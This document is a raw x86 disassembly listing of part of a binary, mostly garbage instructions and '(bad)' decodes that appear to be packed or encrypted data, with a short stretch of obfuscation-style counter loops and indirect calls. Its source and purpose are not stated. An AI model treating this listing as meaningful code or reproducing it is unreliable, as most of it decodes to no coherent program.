  40d5d9:	and    eax,0xf2ce5f8b
  40d5de:	fcomp  QWORD PTR [eax+esi*4-0x6b]
  40d5e2:	pop    es
  40d5e3:	fwait
  40d5e4:	xchg   edx,eax
  40d5e5:	push   0x12
  40d5e7:	popa   
  40d5e8:	push   ebp
  40d5e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5ea:	mov    ds:0xfbc5deab,al
  40d5ef:	jae    0x40d611
  40d5f1:	pop    edi
  40d5f2:	xor    bh,BYTE PTR [ebp+0x62]
  40d5f5:	ins    DWORD PTR es:[edi],dx
  40d5f6:	mov    BYTE PTR [ecx],dl
  40d5f8:	sti    
  40d5f9:	xchg   ebp,eax
  40d5fa:	adc    edx,ebp
  40d5fc:	push   cs
  40d5fd:	(bad)
  40d601:	push   cs
  40d602:	std    
  40d603:	add    cl,BYTE PTR [edx+0x314bd0d9]
  40d609:	jmp    esi
  40d60b:	mov    BYTE PTR [edx+0x57e4970],bl
  40d611:	cmc    
  40d612:	fdivr  QWORD PTR [ebx+0x7f]
  40d615:	inc    ebp
  40d616:	mov    ebp,DWORD PTR [edx-0x70686885]
  40d61c:	sbb    edi,DWORD PTR [ebx+edi*4-0x66512427]
  40d623:	fiadd  WORD PTR [esi]
  40d625:	imul   esp,DWORD PTR [edi+0x58],0xffffffc4
  40d629:	add    al,0xbf
  40d62b:	sti    
  40d62c:	fisttp DWORD PTR [ecx-0x59]
  40d62f:	adc    al,0x8
  40d631:	push   esp
  40d632:	out    dx,al
  40d633:	aad    0x5c
  40d635:	and    al,0x81
  40d637:	jne    0x40d65a
  40d639:	pop    edx
  40d63a:	lods   al,BYTE PTR ds:[esi]
  40d63b:	imul   edi,DWORD PTR [ebx],0x20538d1c
  40d641:	in     eax,0x47
  40d643:	pop    edi
  40d644:	shl    ah,1
  40d646:	imul   DWORD PTR [ebx]
  40d648:	pop    DWORD PTR [esp+edx*1+0x553f816e]
  40d64f:	add    DWORD PTR [edx+ebp*4+0x79],esi
  40d653:	mov    ds:0xba826f06,eax
  40d658:	mov    esp,0x2c706e53
  40d65d:	or     ebx,eax
  40d65f:	dec    esi
  40d660:	jecxz  0x40d61b
  40d662:	sbb    esi,DWORD PTR [edi-0x1a4de559]
  40d668:	mov    ?,WORD PTR [edi-0x71]
  40d66b:	jl     0x40d669
  40d66d:	je     0x40d655
  40d66f:	push   ds
  40d670:	pop    ebx
  40d671:	(bad)  
  40d672:	mov    WORD PTR [edx+0x30],?
  40d675:	jno    0x40d649
  40d677:	(bad)  
  40d678:	loopne 0x40d5ff
  40d67a:	xchg   BYTE PTR [eax-0xc0a1310],bh
  40d680:	rcr    BYTE PTR [eax],0x97
  40d683:	lods   eax,DWORD PTR ds:[esi]
  40d684:	pushf  
  40d685:	arpl   WORD PTR ds:0xc177e943,bp
  40d68b:	push   cs
  40d68c:	mov    cl,0xf
  40d68e:	jl     0x40d68f
  40d690:	pop    esp
  40d691:	test   DWORD PTR ds:0x66b2df2a,edx
  40d697:	mov    edi,?
  40d699:	scas   al,BYTE PTR es:[edi]
  40d69a:	imul   esp,esp,0xfc5587fd
  40d6a0:	and    ecx,DWORD PTR [ebx+0x74]
  40d6a3:	shl    DWORD PTR [eax+0x7a94e9fb],cl
  40d6a9:	dec    esi
  40d6aa:	test   eax,0x82032edf
  40d6af:	scas   al,BYTE PTR es:[edi]
  40d6b0:	adc    al,0x51
  40d6b2:	fcomp  QWORD PTR [edi-0x371cd3a7]
  40d6b8:	nop
  40d6b9:	jmp    0x600:0x77156c2
  40d6c0:	jp     0x40d702
  40d6c2:	add    edi,eax
  40d6c4:	scas   al,BYTE PTR es:[edi]
  40d6c5:	push   0x635e523b
  40d6ca:	mov    dh,0xf7
  40d6cc:	retf   
  40d6cd:	sahf   
  40d6ce:	mov    bl,0x76
  40d6d0:	dec    ebx
  40d6d1:	dec    esi
  40d6d2:	rol    BYTE PTR [edx-0x2592d4e],cl
  40d6d8:	mov    ebp,0x3ddc3c17
  40d6dd:	xchg   edi,eax
  40d6de:	out    dx,al
  40d6df:	das    
  40d6e0:	add    DWORD PTR [ecx],0x73562d4f
  40d6e6:	cmc    
  40d6e7:	fldcw  WORD PTR [esi+0x61]
  40d6ea:	inc    edi
  40d6eb:	mov    bl,0x94
  40d6ed:	mov    edx,0x3a39c3a3
  40d6f2:	out    dx,eax
  40d6f3:	call   0x64f8:0x521b3665
  40d6fa:	mov    ecx,0x4573
  40d6ff:	add    edx,ecx
  40d701:	not    esi
  40d703:	mov    esi,0x7879
  40d708:	or     edi,0x6bdc
  40d70e:	mov    edi,0x1556
  40d713:	sub    DWORD PTR ds:0x43441d,0x432dde
  40d71d:	xchg   esi,ecx
  40d71f:	sub    edx,edi
  40d721:	xor    DWORD PTR ds:0x434411,0x1648
  40d72b:	xor    esi,esi
  40d72d:	and    DWORD PTR ds:0x432dca,0x0
  40d737:	jmp    0x40d749
  40d73c:	mov    ecx,DWORD PTR ds:0x432dca
  40d742:	inc    ecx
  40d743:	mov    DWORD PTR ds:0x432dca,ecx
  40d749:	cmp    DWORD PTR ds:0x432dca,0x11
  40d750:	jae    0x40d7ce
  40d756:	cmp    DWORD PTR ds:0x432dca,0x1e
  40d75d:	jne    0x40d76e
  40d763:	push   0x470a
  40d768:	call   DWORD PTR ds:0x432c72
  40d76e:	jmp    0x40d73c
  40d773:	and    DWORD PTR ds:0x434386,0x0
  40d77d:	mov    ecx,DWORD PTR ds:0x434386
  40d783:	inc    ecx
  40d784:	mov    DWORD PTR ds:0x434386,ecx
  40d78a:	cmp    DWORD PTR ds:0x434386,0xa
  40d791:	jne    0x40d7a7
  40d797:	push   0x4328db
  40d79c:	push   0x43287d
  40d7a1:	call   DWORD PTR ds:0x4329f6
  40d7a7:	cmp    DWORD PTR ds:0x434386,0x9
  40d7ae:	jne    0x40d7c1
  40d7b4:	mov    ecx,DWORD PTR ds:0x434386
  40d7ba:	inc    ecx
  40d7bb:	mov    DWORD PTR ds:0x434386,ecx
  40d7c1:	cmp    DWORD PTR ds:0x434386,0x18
  40d7c8:	jb     0x40d77d
  40d7ce:	mov    DWORD PTR [ebp-0x28],esi
  40d7d1:	mov    DWORD PTR [ebp-0x2c],esi
  40d7d4:	and    DWORD PTR ds:0x434396,0x0
  40d7de:	jmp    0x40d7f0
  40d7e3:	mov    ecx,DWORD PTR ds:0x434396
  40d7e9:	inc    ecx
  40d7ea:	mov    DWORD PTR ds:0x434396,ecx
  40d7f0:	cmp    DWORD PTR ds:0x434396,0x1f
  40d7f7:	jae    0x40d83c
  40d7fd:	cmp    DWORD PTR ds:0x434396,0x11
  40d804:	jne    0x40d813
  40d80a:	push   DWORD PTR [ebp-0x28]
  40d80d:	call   DWORD PTR ds:0x4329fa
  40d813:	cmp    DWORD PTR ds:0x434396,0x10
  40d81a:	jne    0x40d82d
  40d820:	mov    ecx,DWORD PTR ds:0x434396
  40d826:	inc    ecx
  40d827:	mov    DWORD PTR ds:0x434396,ecx
  40d82d:	jmp    0x40d7e3
  40d832:	or     DWORD PTR ds:0x432de2,0x1ed3
  40d83c:	mov    DWORD PTR [ebp-0x14],esi
  40d83f:	adc    DWORD PTR ds:0x432704,0x1c7c
  40d849:	jmp    0x40dc3d
  40d84e:	addr16 int3 
  40d850:	ss data16 mov cl,0x62
  40d854:	ja     0x40d81f
  40d856:	or     bl,BYTE PTR [esi-0x3c]
  40d859:	in     al,0x48
  40d85b:	test   eax,0x8a573eee
  40d860:	jo     0x40d8d2
  40d862:	dec    ecx
  40d863:	jge    0x40d8d5
  40d865:	jo     0x40d857
  40d867:	cld    
  40d868:	cmc    
  40d869:	mov    ch,0xff
  40d86b:	xchg   edi,eax
  40d86c:	int    0x83
  40d86e:	inc    esi
  40d86f:	push   ss
  40d870:	lea    ebx,[edi+0x64248d59]
  40d876:	ja     0x40d8df
  40d878:	mov    esi,0xf50f63f0
  40d87d:	ret    0xdd43
  40d880:	cld    
  40d881:	inc    ebx
  40d882:	stos   DWORD PTR es:[edi],eax
  40d883:	in     eax,0xf4
  40d885:	aas    
  40d886:	fsub   DWORD PTR [eax-0x3bea812c]
  40d88c:	stc    
  40d88d:	cwde   
  40d88e:	lds    edi,FWORD PTR [esi]
  40d890:	into   
  40d891:	shl    BYTE PTR [edi],0xe7
  40d894:	in     al,dx
  40d895:	imul   ecx,edi,0xffffffe3
  40d898:	(bad)  
  40d899:	loopne 0x40d892
  40d89b:	dec    ebp
  40d89c:	cmp    cl,bl
  40d89e:	ins    DWORD PTR es:[edi],dx
  40d89f:	push   cs
  40d8a0:	lds    esp,FWORD PTR [ebp+0x75459b42]
  40d8a6:	cmp    bh,ch
  40d8a8:	sbb    eax,0xcd1806d2
  40d8ad:	(bad)  
  40d8ae:	adc    al,0x4f
  40d8b0:	cli    
  40d8b1:	xor    DWORD PTR ds:0xb9189ac5,esp
  40d8b7:	movq   mm6,QWORD PTR [edx-0x1c]
  40d8bb:	in     al,dx
  40d8bc:	xchg   DWORD PTR [edi-0x5c],esi
  40d8bf:	ror    BYTE PTR [edx+0x55f22e83],0xf8
  40d8c6:	jl     0x40d8af
  40d8c8:	in     al,0xf9
  40d8ca:	push   ss
  40d8cb:	push   edi
  40d8cc:	xchg   DWORD PTR [ebx+0x656f5e63],edi
  40d8d2:	aam    0x78
  40d8d4:	push   cs
  40d8d5:	dec    ecx
  40d8d6:	js     0x40d8fa
  40d8d8:	push   ecx
  40d8d9:	xor    al,0x4
  40d8db:	mov    ebp,0xe97c9e79
  40d8e0:	clc    
  40d8e1:	inc    ebp
  40d8e2:	or     edi,DWORD PTR [esi]
  40d8e4:	jo     0x40d93f
  40d8e6:	icebp  
  40d8e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8e8:	push   ebx
  40d8e9:	push   ebp
  40d8ea:	xor    eax,0x23a626de
  40d8ef:	lds    ebx,FWORD PTR [ecx+0x507b234e]
  40d8f5:	jnp    0x40d8d9
  40d8f7:	ds push 0x5d
  40d8fa:	enter  0x36d1,0x22
  40d8fe:	test   al,0x29
  40d900:	add    ebx,DWORD PTR [ecx]
  40d902:	add    eax,0xf371c84b
  40d907:	cwde   
  40d908:	dec    ecx
  40d909:	retf   
  40d90a:	or     bl,BYTE PTR [ebx]
  40d90c:	sbb    eax,0x79c60ad5
  40d911:	or     al,0x75
  40d913:	inc    ebp
  40d914:	push   eax
  40d915:	mov    bh,BYTE PTR [edi-0x41ce1288]
  40d91b:	sahf   
  40d91c:	leave  
  40d91d:	pop    ss
  40d91e:	jb     0x40d905
  40d920:	jne    0x40d959
  40d922:	dec    ebx
  40d923:	push   esi
  40d924:	scas   al,BYTE PTR es:[edi]
  40d925:	add    BYTE PTR [edx-0x60eff7e1],cl
  40d92b:	test   eax,0x6310a4c9
  40d930:	leave  
  40d931:	sbb    BYTE PTR [ebx-0x7c07abe7],0x4f
  40d938:	and    ebx,ecx
  40d93a:	xchg   ah,al
  40d93c:	imul   edi,DWORD PTR [edi+eiz*2+0x37],0xdf8098ee
  40d944:	cmp    eax,0xfac7ba1b
  40d949:	mov    DWORD PTR [eax],esi
  40d94b:	test   DWORD PTR [ecx],eax
  40d94d:	dec    esi
  40d94e:	ss pusha 
  40d950:	inc    edx
  40d951:	call   0x1bdbb850
  40d956:	sub    BYTE PTR [ecx],0x42
  40d959:	rcl    BYTE PTR [edi],cl
  40d95b:	sbb    esp,DWORD PTR [ebp+0x71]
  40d95e:	enter  0xd27b,0xf5
  40d962:	cli    
  40d963:	mov    al,ds:0x6a7e7c32
  40d968:	mov    dl,0xe
  40d96a:	retf   
  40d96b:	test   al,0x74
  40d96d:	aam    0xd3
  40d96f:	sbb    ecx,0x26
  40d972:	inc    eax
  40d973:	ret    
  40d974:	neg    DWORD PTR [ebx]
  40d976:	inc    ecx
  40d977:	xchg   esi,eax
  40d978:	ja     0x40d956
  40d97a:	or     DWORD PTR [ebp+0x7b326b73],ebx
  40d980:	and    DWORD PTR [edx],edx
  40d982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d983:	jmp    0x9a86e241
  40d988:	and    al,0xc8
  40d98a:	cmp    bl,BYTE PTR [esp+edi*2-0x63]
  40d98e:	jmp    0x40d92a
  40d990:	inc    ebx
  40d991:	inc    ecx
  40d992:	int    0x38
  40d994:	adc    esi,edi
  40d996:	enter  0xcce8,0x8a
  40d99a:	outs   dx,DWORD PTR ds:[esi]
  40d99b:	add    BYTE PTR [ebp+0x58],0xe2
  40d99f:	mov    cl,0x4
  40d9a1:	shr    ch,cl
  40d9a3:	or     eax,0x3bb6b4b
  40d9a8:	jo     0x40da04
  40d9aa:	sbb    BYTE PTR [eax+0x26ef2371],dh
  40d9b0:	call   0xe9d:0xf9f699d0
  40d9b7:	push   edi
  40d9b8:	test   DWORD PTR [ebp-0x5d30e1a4],0xc9ba0b9
  40d9c2:	push   ebp
  40d9c3:	daa    
  40d9c4:	cmp    al,BYTE PTR [ebx]
  40d9c6:	dec    ecx
  40d9c7:	outs   dx,BYTE PTR ds:[esi]
  40d9c8:	(bad)  
  40d9ca:	inc    ebp
  40d9cb:	call   0x9cf3a581
  40d9d0:	jne    0x40d9ad
  40d9d2:	lea    esp,[eax+0x4853b05e]
  40d9d8:	mov    esi,0xc802b9ec
  40d9dd:	repnz fisttp QWORD PTR [eax+0x10]
  40d9e1:	adc    esi,DWORD PTR [ebx-0x6ad87c75]
  40d9e7:	stc    
  40d9e8:	aas    
  40d9e9:	clc    
  40d9ea:	in     eax,0xbd
  40d9ec:	sti    
  40d9ed:	sub    eax,0x38f2e4ad
  40d9f2:	loope  0x40d9fd
  40d9f4:	or     DWORD PTR [ebx],edi
  40d9f6:	out    0x8e,al
  40d9f8:	data16 jle 0x40da10
  40d9fb:	adc    DWORD PTR [edi+ebp*1+0x2eb759a5],ebx
  40da02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da03:	int3   
  40da04:	pushf  
  40da05:	inc    edx
  40da06:	(bad)  
  40da08:	mov    ch,0x52
  40da0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da0b:	lock jmp 0x89ac:0x236356f9
  40da13:	push   ebp
  40da14:	xchg   ecx,eax
  40da15:	adc    DWORD PTR [eax],esi
  40da17:	stos   DWORD PTR es:[edi],eax
  40da18:	jg     0x40d9f4
  40da1a:	mov    dh,0x48
  40da1c:	add    DWORD PTR [ebp+0x6d],esi
  40da1f:	pop    ebx
  40da20:	sub    ecx,DWORD PTR [esi+0x7e]
  40da23:	loopne 0x40da17
  40da25:	pop    edi
  40da26:	mov    ebp,0x6442c910
  40da2b:	push   cs
  40da2c:	mov    fs,WORD PTR [esi+0x31]
  40da2f:	cs jmp 0x40da10
  40da32:	xlat   BYTE PTR ds:[ebx]
  40da33:	xor    ah,BYTE PTR [ecx+0x5bd1ade9]
  40da39:	sub    BYTE PTR [ecx-0x32383b44],dl
  40da3f:	mov    esp,0x14b463e5
  40da44:	gs ins BYTE PTR es:[di],dx
  40da47:	push   ds
  40da48:	(bad)  
  40da49:	mov    al,ds:0x2fa3490e
  40da4e:	mov    bh,0xad
  40da50:	sub    DWORD PTR [esi],edi
  40da52:	aad    0x60
  40da54:	dec    esi
  40da55:	repnz inc ecx
  40da57:	(bad)  
  40da58:	lods   al,BYTE PTR ds:[esi]
  40da59:	sbb    al,0xaa
  40da5b:	sbb    edi,DWORD PTR [edx+0x6e9b1429]
  40da61:	mov    edx,0x49745681
  40da66:	int    0x93
  40da68:	push   edx
  40da69:	add    DWORD PTR [esi+0x2e],edi
  40da6c:	jo     0x40da22
  40da6e:	ds nop
  40da70:	mov    cl,0x47
  40da72:	mov    bl,0x80
  40da74:	xor    edx,DWORD PTR [edi]
  40da76:	popa   
  40da77:	lods   al,BYTE PTR ds:[esi]
  40da78:	dec    edi
  40da79:	std    
  40da7a:	repz sbb BYTE PTR [edx],al
  40da7d:	mov    BYTE PTR [ebp-0x507b21db],al
  40da83:	jp     0x40dabb
  40da85:	mov    bl,0xb
  40da87:	rcl    DWORD PTR [edi],0x7b
  40da8a:	pop    ebp
  40da8b:	lds    ebp,FWORD PTR [edx+0x41caf3bb]
  40da91:	jle    0x40dac3
  40da93:	popw   es
  40da95:	jmp    0xebb0:0xbe8a61fd
  40da9c:	jmp    0x6fd0:0xf97ea0e8
  40daa3:	in     al,dx
  40daa4:	inc    ecx
  40daa5:	sar    DWORD PTR [ebx],1
  40daa7:	xlat   BYTE PTR ds:[ebx]
  40daa8:	gs iret 
  40daaa:	or     al,0x10
  40daac:	pop    eax
  40daad:	rol    edx,0x8e
  40dab0:	aam    0x7a
  40dab2:	or     al,0x7
  40dab4:	arpl   WORD PTR [ecx],si
  40dab6:	jo     0x40da80
  40dab8:	js     0x40da71
  40daba:	xchg   DWORD PTR [ebp-0x10355a75],edx
  40dac0:	cmp    ch,cl
  40dac2:	shl    DWORD PTR [ebx+ebp*1+0x39],cl
  40dac6:	mov    dl,0x8d
  40dac8:	fcom   DWORD PTR [ebp-0x42]
  40dacb:	and    edi,esp
  40dacd:	je     0x40db45
  40dacf:	sbb    ecx,DWORD PTR [edx+0x18fc5a79]
  40dad5:	sbb    DWORD PTR [ecx+0x453e55ca],ebx
  40dadb:	mov    ecx,0x4a1993ed
  40dae0:	xchg   ecx,eax
  40dae1:	sahf   
  40dae2:	jno    0x40db5c
  40dae4:	and    eax,0xe3a9aa5b
  40dae9:	nop
  40daea:	adc    esp,DWORD PTR es:[eax-0x6e]
  40daee:	mov    BYTE PTR [edi-0x2a],bl
  40daf1:	jl     0x40db4c
  40daf3:	fisub  WORD PTR [eax-0x4da2daba]
  40daf9:	call   0xbb0b:0x45e2cc2a
  40db00:	mov    ds:0x85e053cd,al
  40db05:	pop    ebx
  40db06:	xchg   DWORD PTR [edx+ebx*2+0x27],ebx
  40db0a:	push   edi
  40db0b:	xchg   DWORD PTR [eax-0x47471b51],edx
  40db11:	(bad)  
  40db13:	xlat   BYTE PTR ds:[ebx]
  40db14:	mov    esi,0x4b36adb3
  40db19:	ins    BYTE PTR es:[edi],dx
  40db1a:	cmc    
  40db1b:	iret   
  40db1c:	(bad)  
  40db1d:	sbb    cl,BYTE PTR [esi]
  40db1f:	mov    bh,0x95
  40db21:	call   0x447a0a83
  40db26:	clc    
  40db27:	inc    ebx
  40db28:	test   eax,0x2ed9e762
  40db2d:	jecxz  0x40db3b
  40db2f:	bound  esp,QWORD PTR [esi+0x732ad292]
  40db35:	dec    ebp
  40db37:	shr    BYTE PTR [ebp-0x49],cl
  40db3a:	test   al,0x49
  40db3c:	ja     0x40db96
  40db3e:	add    ebp,DWORD PTR [ebp-0x65]
  40db41:	mov    ecx,0x70e5c63d
  40db46:	push   es
  40db47:	fsub   QWORD PTR [edx+0x2d]
  40db4a:	lock scas eax,DWORD PTR es:[edi]
  40db4c:	dec    ebx
  40db4d:	pop    esp
  40db4e:	mov    esp,0x5ed8ffec
  40db53:	mov    esp,0xe863daae
  40db58:	hlt    
  40db59:	pop    es
  40db5a:	inc    edx
  40db5b:	push   0x829d6b0e
  40db60:	pushf  
  40db61:	in     eax,dx
  40db62:	iret   
  40db63:	mov    ds:0x828235ea,eax
  40db68:	ja     0x40db4f
  40db6a:	sar    BYTE PTR [edx],0x97
  40db6d:	loope  0x40db0b
  40db6f:	sbb    esp,DWORD PTR [ecx-0x61edfc0a]
  40db75:	and    ebx,DWORD PTR [esi+0x2c]
  40db78:	fs cmc 
  40db7a:	mov    dl,0x2e
  40db7c:	scas   eax,DWORD PTR es:[edi]
  40db7d:	scas   al,BYTE PTR es:[edi]
  40db7e:	pop    ebx
  40db7f:	adc    eax,0x2267f098
  40db84:	pop    esi
  40db85:	lock daa 
  40db87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db88:	(bad)  [ebx]
  40db8a:	push   ecx
  40db8b:	add    eax,0x621a6bb1
  40db90:	push   ss
  40db91:	sub    eax,0xd427e4be
  40db96:	aad    0xb7
  40db98:	jle    0x40dbf8
  40db9a:	mov    edx,0x8dac5c00
  40db9f:	clc    
  40dba0:	mov    edx,0xa2afe5f4
  40dba5:	lds    ebp,FWORD PTR [edx]
  40dba7:	jne    0x40dbaf
  40dba9:	sub    BYTE PTR [edi+eiz*8],ah
  40dbac:	mov    ds:0xc64b44c8,al
  40dbb1:	dec    esi
  40dbb2:	mov    esi,0x23cc3c7e
  40dbb7:	jb     0x40dbd2
  40dbb9:	sub    bl,BYTE PTR [ebp-0x31]
  40dbbc:	repnz mov si,WORD PTR [edi+0x3b88fcb5]
  40dbc4:	out    dx,eax
  40dbc5:	dec    esp
  40dbc6:	mov    ch,0x34
  40dbc8:	mov    dl,0x59
  40dbca:	push   esi
  40dbcb:	push   cs
  40dbcc:	xchg   esi,eax
  40dbcd:	xlat   BYTE PTR ds:[ebx]
  40dbce:	jle    0x40db65
  40dbd0:	out    dx,eax
  40dbd1:	into   
  40dbd2:	jp     0x40dbff
  40dbd4:	data16 jl 0x40dc23
  40dbd7:	ins    DWORD PTR es:[edi],dx
  40dbd8:	push   ss
  40dbd9:	scas   eax,DWORD PTR es:[edi]
  40dbda:	shr    eax,cl
  40dbdc:	sbb    eax,0x15fd1fde
  40dbe1:	sti    
  40dbe2:	and    BYTE PTR [ebx],ch
  40dbe4:	xchg   DWORD PTR [edi-0x8],ebx
  40dbe7:	loopne 0x40db9f
  40dbe9:	cdq    
  40dbea:	jecxz  0x40dc67
  40dbec:	pop    eax
  40dbed:	shl    BYTE PTR gs:[edi+0xb336227],0xbd
  40dbf5:	dec    ebp
  40dbf6:	mov    bh,0x4e
  40dbf8:	into   
  40dbf9:	jne    0x40dc0d
  40dbfb:	es and ebp,ebx
  40dbfe:	mov    cl,0x63
  40dc00:	mov    bl,BYTE PTR [ebx-0x190372d3]
  40dc06:	outs   dx,BYTE PTR ds:[esi]
  40dc07:	sub    edi,DWORD PTR [eax-0x70]
  40dc0a:	dec    edx
  40dc0b:	mov    ch,0x49
  40dc0d:	aas    
  40dc0e:	add    BYTE PTR [esp+eiz*4-0x18],0x69
  40dc13:	jne    0x40dc86
  40dc15:	mov    gs,WORD PTR [eax]
  40dc17:	ss out dx,al
  40dc19:	(bad)  
  40dc1a:	inc    ebx
  40dc1b:	dec    ebp
  40dc1c:	dec    sp
  40dc1e:	push   0xc
  40dc20:	pop    edi
  40dc21:	pop    edi
  40dc22:	nop
  40dc23:	outs   dx,DWORD PTR ds:[esi]
  40dc24:	sub    edi,eax
  40dc26:	loop   0x40dc36
  40dc28:	jmp    0xad71da39
  40dc2d:	sbb    DWORD PTR [eax-0x37331dd8],esi
  40dc33:	xor    ebx,edx
  40dc35:	mov    ecx,0x386c260b
  40dc3a:	adc    bl,BYTE PTR [edi-0x78a76b5]
  40dc40:	mov    ecx,DWORD PTR ds:0x43439a
  40dc46:	and    DWORD PTR ds:0x432dc6,ecx
  40dc4c:	mov    ecx,DWORD PTR [ebp-0x18]
  40dc4f:	and    DWORD PTR ds:0x4326f8,0x434411
  40dc59:	xor    ecx,eax
  40dc5b:	jmp    0x40e04f
  40dc60:	mov    bl,0x93
  40dc62:	iret   
  40dc63:	(bad)
  40dc66:	mov    cl,0x71
  40dc68:	out    0x43,eax
  40dc6a:	fs jb  0x40dc12
  40dc6d:	not    DWORD PTR [edi+0x38]
  40dc70:	mov    al,ds:0x49707096
  40dc75:	jge    0x40dce7
  40dc77:	jo     0x40dcac
  40dc79:	rol    BYTE PTR [eax-0x67d69015],cl
  40dc7f:	pop    ebx
  40dc80:	jbe    0x40dcfd
  40dc82:	jp     0x40dc96
  40dc84:	jmp    0x4af8dd2c
  40dc89:	fwait
  40dc8a:	ja     0x40dc3c
  40dc8c:	pop    eax
  40dc8d:	scas   eax,DWORD PTR es:[edi]
  40dc8e:	xlat   BYTE PTR ds:[ebx]
  40dc8f:	fidiv  DWORD PTR [edx+edx*2]
  40dc92:	jne    0x40dce6
  40dc94:	sbb    DWORD PTR [ecx],ecx
  40dc96:	outs   dx,DWORD PTR ds:[esi]
  40dc97:	xor    al,0x7f
  40dc99:	or     DWORD PTR [ebx+0x4d],ecx
  40dc9c:	pop    ss
  40dc9d:	test   eax,0x78c06b48
  40dca3:	push   eax
  40dca4:	inc    eax
  40dca5:	gs sbb al,0xbc
  40dca8:	mov    esp,0xe2ea0747
  40dcad:	adc    ecx,DWORD PTR [ebx+edi*4]
  40dcb0:	push   ebp
  40dcb1:	pushf  
  40dcb2:	fisttp DWORD PTR [edi-0x33]
  40dcb5:	in     eax,dx
  40dcb6:	jo     0x40dca8
  40dcb8:	fidivr DWORD PTR [edx]
  40dcba:	jae    0x40dc7d
  40dcbc:	out    dx,eax
  40dcbd:	shr    BYTE PTR [ecx-0x23],cl
  40dcc0:	ds sti 
  40dcc2:	fld    TBYTE PTR [ecx+0x3ed3fa41]
  40dcc8:	mov    bl,0x65
  40dcca:	or     bl,BYTE PTR ds:[eax-0x4b]
  40dcce:	hlt    
  40dccf:	cmp    DWORD PTR [edi+0x44ae2fd3],edi
  40dcd5:	push   ss
  40dcd6:	cs daa 
  40dcd8:	sub    DWORD PTR ds:0xb8a9c88,esp
  40dcde:	inc    eax
  40dcdf:	inc    ecx
  40dce0:	sti    
  40dce1:	adc    BYTE PTR [ecx+ebx*1-0x2d],ch
  40dce5:	into   
  40dce6:	xor    DWORD PTR [ebp+0x34],edx
  40dce9:	fcmovnbe st,st(6)
  40dceb:	stos   DWORD PTR es:[edi],eax
  40dcec:	pop    eax
  40dced:	(bad)  
  40dcee:	xor    al,0x37
  40dcf0:	sbb    al,0x2c
  40dcf2:	das    
  40dcf3:	xchg   ecx,ecx
  40dcf5:	mov    dl,0xae
  40dcf7:	out    0x12,eax
  40dcf9:	in     eax,dx
  40dcfa:	out    0xed,eax
  40dcfc:	dec    eax
  40dcfd:	in     al,0xda
  40dcff:	shl    BYTE PTR ds:0xc9f18dca,0xfc
  40dd06:	loop   0x40dcc6
  40dd08:	mov    dh,0x62
  40dd0a:	and    al,0x18
  40dd0c:	in     al,dx
  40dd0d:	fwait
  40dd0e:	mov    ecx,DWORD PTR ds:0xcf54e431
  40dd14:	xchg   DWORD PTR ds:0x61bff621,edi
  40dd1a:	add    edi,eax
  40dd1c:	jb     0x40dcb2
  40dd1e:	sub    ebp,DWORD PTR [ecx-0x4b]
  40dd21:	inc    esp
  40dd22:	xor    ecx,ebx
  40dd24:	repnz aad 0xc9
  40dd27:	adc    ecx,DWORD PTR [ebp-0x5d]
  40dd2a:	ds inc ebx
  40dd2c:	daa    
  40dd2d:	repz test ax,0x56f0
  40dd32:	mov    ebp,DWORD PTR [eax]
  40dd34:	fild   WORD PTR [esi+0x39]
  40dd37:	jle    0x40dd26
  40dd39:	arpl   WORD PTR [ebx+0x3e],sp
  40dd3c:	ret    0xa024
  40dd3f:	(bad)  
  40dd41:	or     BYTE PTR ds:0x1a85c0d1,0xb7
  40dd48:	adc    BYTE PTR [ecx],cl
  40dd4a:	ins    DWORD PTR es:[edi],dx
  40dd4b:	lea    eax,[ebp-0x15da4635]
  40dd51:	xor    eax,0x7358f931
  40dd56:	xor    ebx,DWORD PTR [edx-0x406fdd61]
  40dd5c:	add    BYTE PTR [edx],al
  40dd5e:	fbld   TBYTE PTR [edi*2+0x3f4ce5c6]
  40dd65:	iret   
  40dd66:	ins    BYTE PTR es:[edi],dx
  40dd67:	dec    eax
  40dd68:	shl    BYTE PTR [edx-0x71],cl
  40dd6b:	add    cl,BYTE PTR [eax-0x7b]
  40dd6e:	xor    al,0x9
  40dd70:	xor    eax,0x3d092c33
  40dd75:	add    eax,ecx
  40dd77:	mov    esp,0xbd0ad6df
  40dd7c:	adc    DWORD PTR ss:[ecx],ecx
  40dd7f:	cmp    edi,esi
  40dd81:	adc    eax,0xc8f5ab7c
  40dd86:	push   esi
  40dd87:	mov    ebx,DWORD PTR [esi+0x3572ebfe]
  40dd8d:	mov    bh,0x7b
  40dd8f:	int    0x37
  40dd91:	out    dx,eax
  40dd92:	jns    0x40ddda
  40dd94:	inc    edi
  40dd95:	xor    BYTE PTR [eax+ebp*8],ch
  40dd98:	sub    BYTE PTR ss:[edi+0x75],bh
  40dd9c:	push   esp
  40dd9d:	leave  
  40dd9e:	sub    ebp,esp
  40dda0:	mov    eax,0x6de978b6
  40dda5:	imul   BYTE PTR [edx-0x604b64c0]
  40ddab:	cmc    
  40ddac:	retf   0x930b
  40ddaf:	xor    DWORD PTR [ebx+0x188dd6e9],ebx
  40ddb5:	lods   eax,DWORD PTR ds:[esi]
  40ddb6:	mov    BYTE PTR [esi-0x598f2f11],ch
  40ddbc:	ficomp WORD PTR [esi-0x54]
  40ddbf:	add    al,0x8
  40ddc1:	mov    al,0xbf
  40ddc3:	les    eax,FWORD PTR [esi]
  40ddc5:	sti    
  40ddc6:	inc    ebx
  40ddc7:	sbb    BYTE PTR [esp+esi*2+0x3b],dh
  40ddcb:	cli    
  40ddcc:	xor    BYTE PTR [esi],ah
  40ddce:	ret    0xa0c7
  40ddd1:	sahf   
  40ddd2:	adc    DWORD PTR [esp+ebp*2+0x3c],ebx
  40ddd6:	adc    eax,0x35fd4d5b
  40dddb:	add    DWORD PTR [edi],0xe
  40ddde:	ret    0x723c
  40dde1:	(bad)  
  40dde2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dde3:	sbb    ch,BYTE PTR [ebp+0x6d]
  40dde6:	adc    BYTE PTR [ecx+0x55],0x3a
  40ddea:	shl    BYTE PTR [ecx],1
  40ddec:	ins    DWORD PTR es:[edi],dx
  40dded:	and    DWORD PTR [esi-0x1e],esp
  40ddf0:	sub    BYTE PTR [ebp-0x50],cl
  40ddf3:	jecxz  0x40de31
